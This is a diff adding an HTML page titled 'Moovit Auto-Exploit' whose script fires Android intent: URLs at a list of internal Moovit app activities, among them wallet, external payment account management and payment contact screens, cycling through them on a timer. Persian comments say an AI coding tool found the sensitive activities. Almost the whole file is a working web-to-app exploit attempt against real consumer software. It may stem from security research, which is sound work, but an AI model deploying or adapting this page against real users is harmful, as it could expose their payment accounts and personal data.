@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head><title>Moovit Auto-Exploit</title></head>
+<body>
+    <h3>Scanning Unexported Activities...</h3>
+    <div id="status"></div>
+    <script>
+        // لیست فعالیت‌های حساسی که کرسر پیدا کرد
+        const targets = [
+            "com.moovit.app.home.wallet.WalletActivity2",
+            "com.moovit.payment.account.external.management.ExternalPaymentAccountActivity",
+            "com.moovit.payment.contacts.PaymentAccountContactDetailsActivity",
+            "com.moovit.feature.tripplan.history.HistoryTripPlanActivity"
+        ];
+
+        let i = 0;
+        function launchNext() {
+            if (i >= targets.length) {
+                document.getElementById('status').innerText = "Scan Complete.";
+                return;
+            }
+            let target = targets[i];
+            document.getElementById('status').innerText = "Testing: " + target;
+            
+            // شلیک Intent
+            window.location.href = "intent:#Intent;component=com.tranzmate/" + target + ";end";
+            
+            i++;
+            setTimeout(launchNext, 3000); // ۳ ثانیه صبر برای دیدن نتیجه هر کدام
+        }
+        
+        launchNext();
+    </script>
+</body>
+</html>
